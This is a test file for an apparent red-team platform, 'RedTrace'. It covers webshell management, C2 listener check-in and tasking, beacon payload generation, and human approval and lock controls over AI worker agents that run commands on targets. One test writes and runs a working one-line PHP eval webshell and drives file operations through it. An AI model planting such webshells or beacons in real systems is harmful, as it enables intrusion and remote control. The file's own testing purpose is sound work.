from __future__ import annotations

import base64
import json
import shutil
import socket
import subprocess
import time
import urllib.request
from pathlib import Path
from types import SimpleNamespace

import pytest
from fastapi.testclient import TestClient

from redtrace.server import db
from redtrace.server.app import app
from redtrace.server import operations


def _php_runtime_available() -> bool:
    binary = shutil.which("php")
    if binary is None:
        return False
    return (
        subprocess.run(
            [binary, "--version"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=False,
        ).returncode
        == 0
    )


@pytest.fixture
def client(tmp_path: Path, monkeypatch) -> TestClient:
    monkeypatch.setattr(db, "_db_path", None)
    db.configure(tmp_path / "redtrace.db")
    with TestClient(app) as test_client:
        yield test_client


def create_project(client: TestClient) -> str:
    response = client.post(
        "/projects",
        json={"title": "operations", "origin": "authorized target", "goal": "verified result"},
    )
    assert response.status_code == 201
    return response.json()["project"]["id"]


def test_worker_registers_webshell_without_exposing_secret_and_reuses_it(
    client: TestClient,
    monkeypatch,
) -> None:
    project_id = create_project(client)
    headers = {
        "X-RedTrace-Worker": "codex-1",
        "X-RedTrace-Task": "explore",
        "X-RedTrace-Intent": "i001",
    }
    created = client.post(
        f"/projects/{project_id}/resources",
        headers=headers,
        json={
            "kind": "webshell",
            "name": "primary shell",
            "target": "https://target.test/shell.php",
            "summary": "www-data on target.test",
            "metadata": {"method": "POST", "command_param": "pass"},
            "secret": {"password": "never-return-this"},
            "actor_type": "worker",
            "actor": "spoofed",
        },
    )
    assert created.status_code == 201
    resource = created.json()["resource"]
    assert resource["created_by"] == "codex-1"
    assert resource["has_secret"] is True
    assert "secret" not in resource
    assert "password" not in created.text

    class Response:
        text = "uid=33(www-data)"
        encoding = "utf-8"

        def raise_for_status(self) -> None:
            return None

    captured: dict = {}

    def request(method, url, **kwargs):
        captured.update({"method": method, "url": url, **kwargs})
        return Response()

    monkeypatch.setattr(operations.requests, "request", request)
    queued = client.post(
        f"/projects/{project_id}/resources/{resource['id']}/tasks",
        headers=headers,
        json={
            "action": "command",
            "arguments": {"command": "id"},
            "actor_type": "worker",
            "actor": "codex-1",
            "risk": "low",
        },
    )
    assert queued.status_code == 202
    operation_id = queued.json()["task"]["id"]
    for _ in range(50):
        tasks = client.get(f"/projects/{project_id}/operations/tasks").json()["tasks"]
        task = next(item for item in tasks if item["id"] == operation_id)
        if task["status"] == "succeeded":
            break
        time.sleep(0.02)
    assert task["status"] == "succeeded"
    assert task["output_summary"] == "uid=33(www-data)"
    assert captured["data"] == {"pass": "id"}
    assert "never-return-this" not in json.dumps(captured)
    result_id = task["result_ref"].rsplit("/", 1)[-1]
    assert client.get(f"/projects/{project_id}/operations/results/{result_id}").text == "uid=33(www-data)"

    detail = client.get(f"/projects/{project_id}").json()
    resource_fact = next(fact for fact in detail["facts"] if resource["id"] in fact["description"])
    assert "never-return-this" not in resource_fact["description"]


def test_human_can_delete_webshell_resource(client: TestClient) -> None:
    project_id = create_project(client)
    created = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "webshell",
            "name": "待删除 WebShell",
            "target": "https://delete.invalid/shell.php",
            "summary": "删除回归测试",
            "metadata": {"method": "POST", "command_param": "cmd"},
            "secret": {"password": "test-only"},
            "actor_type": "human",
            "actor": "测试员",
        },
    )
    assert created.status_code == 201
    resource_id = created.json()["resource"]["id"]

    deleted = client.delete(
        f"/projects/{project_id}/resources/{resource_id}?actor=测试员"
    )

    assert deleted.status_code == 204
    assert client.get(f"/projects/{project_id}/resources/{resource_id}").status_code == 404
    listed = client.get(f"/projects/{project_id}/resources").json()["resources"]
    assert resource_id not in {resource["id"] for resource in listed}
    audit = client.get(f"/projects/{project_id}/operations/audit").json()["events"]
    assert any(
        event["action"] == "resource.delete" and event["resource_id"] == resource_id
        for event in audit
    )


@pytest.mark.skipif(
    not _php_runtime_available(),
    reason="a working PHP runtime is required for the eval-shell compatibility test",
)
def test_simple_php_eval_webshell_can_be_tested_and_reused(
    client: TestClient,
    tmp_path: Path,
) -> None:
    demo = tmp_path / "shell.php"
    demo.write_text("<?php  @eval($_POST['cmd']);  ?>", encoding="utf-8")
    with socket.socket() as server_socket:
        server_socket.bind(("127.0.0.1", 0))
        port = server_socket.getsockname()[1]
    process = subprocess.Popen(
        [shutil.which("php") or "php", "-S", f"127.0.0.1:{port}", "-t", str(tmp_path)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    target = f"http://127.0.0.1:{port}/shell.php"
    try:
        for _ in range(50):
            try:
                urllib.request.urlopen(target, timeout=0.2).close()
                break
            except Exception:
                time.sleep(0.05)
        else:
            pytest.fail("PHP test server did not start")

        project_id = create_project(client)
        tested = client.post(
            f"/projects/{project_id}/webshell/test",
            json={
                "target": target,
                "password": "cmd",
                "shell_type": "php",
                "protocol": "eval",
                "method": "POST",
                "command_param": "cmd",
                "target_os": "windows",
                "encoding": "utf-8",
            },
        )
        assert tested.status_code == 200
        assert tested.json()["ok"] is True

        created = client.post(
            f"/projects/{project_id}/resources",
            json={
                "kind": "webshell",
                "name": "PHP eval demo",
                "target": target,
                "metadata": {
                    "shell_type": "php",
                    "protocol": "eval",
                    "method": "POST",
                    "command_param": "cmd",
                    "os": "windows",
                    "encoding": "utf-8",
                    "verify_tls": False,
                },
                "secret": {"password": "cmd"},
            },
        )
        assert created.status_code == 201
        resource = created.json()["resource"]
        queued = client.post(
            f"/projects/{project_id}/resources/{resource['id']}/tasks",
            json={"action": "command", "arguments": {"command": "echo REDTRACE_PHP_EVAL_OK"}},
        )
        assert queued.status_code == 202
        operation_id = queued.json()["task"]["id"]
        for _ in range(100):
            tasks = client.get(f"/projects/{project_id}/operations/tasks").json()["tasks"]
            task = next(item for item in tasks if item["id"] == operation_id)
            if task["status"] in {"succeeded", "failed"}:
                break
            time.sleep(0.02)
        assert task["status"] == "succeeded"
        assert "REDTRACE_PHP_EVAL_OK" in task["output_summary"]

        managed = tmp_path / "managed"

        def run_action(action: str, arguments: dict, *, approval: bool = False) -> dict:
            response = client.post(
                f"/projects/{project_id}/resources/{resource['id']}/tasks",
                json={
                    "action": action,
                    "arguments": arguments,
                    "risk": "high" if approval else "low",
                    "requires_approval": approval,
                },
            )
            assert response.status_code == 202
            current = response.json()["task"]
            if approval:
                approved = client.post(
                    f"/projects/{project_id}/operations/tasks/{current['id']}/approval",
                    json={"actor": "operator", "decision": "approve"},
                )
                assert approved.status_code == 200
            for _ in range(100):
                tasks = client.get(f"/projects/{project_id}/operations/tasks").json()["tasks"]
                current = next(item for item in tasks if item["id"] == current["id"])
                if current["status"] in {"succeeded", "failed"}:
                    break
                time.sleep(0.02)
            assert current["status"] == "succeeded", current
            return current

        # Use the same one-line eval shell for the complete file-manager chain.
        run_action("create_directory", {"path": str(managed)})
        file_path = managed / "notes.txt"
        encoded = base64.b64encode("RedTrace 文件管理".encode()).decode()
        run_action("write_file", {"path": str(file_path), "content_base64": encoded})
        listed = run_action("list_files", {"path": str(managed)})
        listing = client.get(listed["result_ref"]).text
        assert "\tnotes.txt\t" in listing
        read = run_action("read_file", {"path": str(file_path)})
        assert base64.b64decode(client.get(read["result_ref"]).text).decode() == "RedTrace 文件管理"
        renamed = managed / "renamed.txt"
        run_action("move_file", {"path": str(file_path), "destination": str(renamed)})
        assert renamed.exists()
        run_action("delete_file", {"path": str(managed)}, approval=True)
        assert not managed.exists()
    finally:
        process.terminate()
        process.wait(timeout=5)


def test_c2_listener_session_task_approval_poll_and_result(client: TestClient) -> None:
    project_id = create_project(client)
    listener_response = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "c2_listener",
            "name": "project beacon",
            "target": "https://redtrace.test/c2",
            "status": "available",
            "actor": "Alice",
        },
    )
    assert listener_response.status_code == 201
    listener = listener_response.json()["resource"]
    listener_token = listener_response.json()["secret_once"]
    assert listener_token not in json.dumps(listener)

    checkin = client.post(
        f"/c2/checkin/{listener['id']}",
        headers={"X-RedTrace-Listener-Token": listener_token},
        json={
            "external_id": "host-01",
            "hostname": "eng-ws01",
            "username": "operator",
            "os": "windows",
            "arch": "amd64",
            "process": "agent.exe",
            "pid": 4242,
            "capabilities": ["command", "upload"],
        },
    )
    assert checkin.status_code == 200
    session_id = checkin.json()["session_id"]
    session_token = checkin.json()["session_token"]

    worker_headers = {
        "X-RedTrace-Worker": "pi-1",
        "X-RedTrace-Task": "explore",
        "X-RedTrace-Intent": "i007",
    }
    operation = client.post(
        f"/projects/{project_id}/resources/{session_id}/tasks",
        headers=worker_headers,
        json={
            "action": "command",
            "arguments": {"command": "whoami", "publish_result": True},
            "risk": "high",
            "actor_type": "worker",
            "actor": "pi-1",
        },
    )
    assert operation.status_code == 202
    task = operation.json()["task"]
    assert task["status"] == "awaiting_approval"

    approved = client.post(
        f"/projects/{project_id}/operations/tasks/{task['id']}/approval",
        json={"actor": "Alice", "decision": "approve"},
    )
    assert approved.status_code == 200
    assert approved.json()["task"]["status"] == "queued"

    poll = client.post(
        f"/c2/sessions/{session_id}/poll",
        headers={"X-RedTrace-Session-Token": session_token},
    )
    assert poll.status_code == 200
    assert poll.json()["tasks"][0]["arguments"]["command"] == "whoami"

    completed = client.post(
        f"/c2/sessions/{session_id}/results/{task['id']}",
        headers={"X-RedTrace-Session-Token": session_token},
        json={
            "success": True,
            "output": "very-long-full-output-corp\\alice",
            "summary": "Confirmed domain identity",
        },
    )
    assert completed.status_code == 200
    assert completed.json()["task"]["status"] == "succeeded"
    assert completed.json()["task"]["fact_id"]

    resources = client.get(f"/projects/{project_id}/resources").json()["resources"]
    kinds = {item["kind"] for item in resources}
    assert {"c2_listener", "c2_session", "result"} <= kinds
    assert all("session_token" not in json.dumps(item) for item in resources)

    exported = client.get(f"/projects/{project_id}/export?format=yaml").text
    assert "shared_resources:" in exported
    assert "operation_tasks:" in exported
    assert listener_token not in exported
    assert session_token not in exported
    assert "very-long-full-output-corp\\alice" not in exported
    assert "Confirmed domain identity" in exported

    with db.get_conn() as conn:
        conn.execute(
            "UPDATE shared_resources SET last_seen_at = '2000-01-01T00:00:00Z' WHERE id = ?",
            (session_id,),
        )
    sessions = client.get(
        f"/projects/{project_id}/resources",
        params={"kind": "c2_session"},
    ).json()["resources"]
    assert sessions[0]["status"] == "offline"
    audit = client.get(f"/projects/{project_id}/operations/audit").json()["events"]
    assert any(event["action"] == "c2.session_offline" for event in audit)


@pytest.mark.skipif(shutil.which("go") is None, reason="Go is required for the Beacon build test")
def test_c2_payload_api_generates_oneliner_and_compiled_beacon(client: TestClient) -> None:
    project_id = create_project(client)
    listener_response = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "c2_listener",
            "name": "HTTP Beacon",
            "target": "0.0.0.0:8443",
            "status": "available",
            "metadata": {
                "listener_type": "http_beacon",
                "bind_host": "0.0.0.0",
                "bind_port": 8443,
                "callback_host": "c2.example.test",
            },
        },
    )
    assert listener_response.status_code == 201
    listener = listener_response.json()["resource"]
    listener_token = listener_response.json()["secret_once"]

    kinds = client.get(
        f"/projects/{project_id}/c2/listeners/{listener['id']}/oneliner-kinds"
    )
    assert kinds.status_code == 200
    assert kinds.json()["kinds"] == ["curl_beacon"]

    generated = client.post(
        f"/projects/{project_id}/c2/payloads/oneliner",
        json={"listener_id": listener["id"], "kind": "curl_beacon"},
    )
    assert generated.status_code == 200
    assert f"/c2/checkin/{listener['id']}" in generated.json()["oneliner"]
    assert listener_token in generated.json()["oneliner"]

    built = client.post(
        f"/projects/{project_id}/c2/payloads/build",
        json={
            "listener_id": listener["id"],
            "callback_url": "http://127.0.0.1:8765",
            "os": "linux",
            "arch": "amd64",
        },
    )
    assert built.status_code == 201
    payload = built.json()["payload"]
    assert payload["kind"] == "c2_payload"
    assert payload["metadata"]["size_bytes"] > 0
    downloaded = client.get(payload["target"])
    assert downloaded.status_code == 200
    assert len(downloaded.content) == payload["metadata"]["size_bytes"]

    exported = client.get(f"/projects/{project_id}/export?format=yaml").text
    assert listener_token not in exported


def test_c2_payload_and_profile_are_project_scoped_references(client: TestClient) -> None:
    project_id = create_project(client)
    payload = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "c2_payload",
            "name": "Windows x64 Beacon",
            "target": "artifact://payloads/beacon.exe",
            "summary": "built by the controlled payload pipeline",
            "metadata": {"platform": "windows", "arch": "amd64", "sha256": "abc123"},
            "actor": "operator",
        },
    )
    profile = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "c2_profile",
            "name": "CDN API profile",
            "target": "profile://cdn-api-v1",
            "summary": "non-secret traffic profile parameters",
            "metadata": {"path": "/api/v1/sync", "jitter": 20},
            "actor": "operator",
        },
    )

    assert payload.status_code == 201
    assert payload.json()["resource"]["id"].startswith("pay_")
    assert profile.status_code == 201
    assert profile.json()["resource"]["id"].startswith("prf_")

    listed = client.get(f"/projects/{project_id}/resources").json()["resources"]
    assert {item["kind"] for item in listed} >= {"c2_payload", "c2_profile"}
    facts = client.get(f"/projects/{project_id}").json()["facts"]
    assert any("C2 载荷" in fact["description"] for fact in facts)
    assert any("C2 流量伪装" in fact["description"] for fact in facts)


def test_human_can_pause_lock_cancel_and_audit_worker_operations(client: TestClient) -> None:
    project_id = create_project(client)
    plugin = client.post(
        f"/projects/{project_id}/resources",
        json={
            "kind": "plugin",
            "name": "scanner",
            "target": "https://plugin.test/run",
            "metadata": {"actions": ["scan"]},
            "secret": {"endpoint": "https://plugin.test/run", "token": "hidden"},
            "actor": "Alice",
        },
    ).json()["resource"]

    assert client.post(
        f"/projects/{project_id}/resources/{plugin['id']}/worker-control",
        json={"paused": True, "actor": "Alice"},
    ).status_code == 200
    blocked = client.post(
        f"/projects/{project_id}/resources/{plugin['id']}/tasks",
        headers={"X-RedTrace-Worker": "claude-1", "X-RedTrace-Task": "explore"},
        json={"action": "scan", "arguments": {}, "actor_type": "worker", "actor": "claude-1"},
    )
    assert blocked.status_code == 423

    client.post(
        f"/projects/{project_id}/resources/{plugin['id']}/worker-control",
        json={"paused": False, "actor": "Alice"},
    )
    client.post(
        f"/projects/{project_id}/resources/{plugin['id']}/lock",
        json={"actor_type": "human", "actor": "Alice"},
    )
    locked = client.post(
        f"/projects/{project_id}/resources/{plugin['id']}/tasks",
        headers={"X-RedTrace-Worker": "claude-1", "X-RedTrace-Task": "explore"},
        json={"action": "scan", "arguments": {}, "actor_type": "worker", "actor": "claude-1"},
    )
    assert locked.status_code == 423

    audit = client.get(f"/projects/{project_id}/operations/audit").json()["events"]
    actions = {event["action"] for event in audit}
    assert {"resource.worker_pause", "resource.worker_resume", "resource.lock"} <= actions
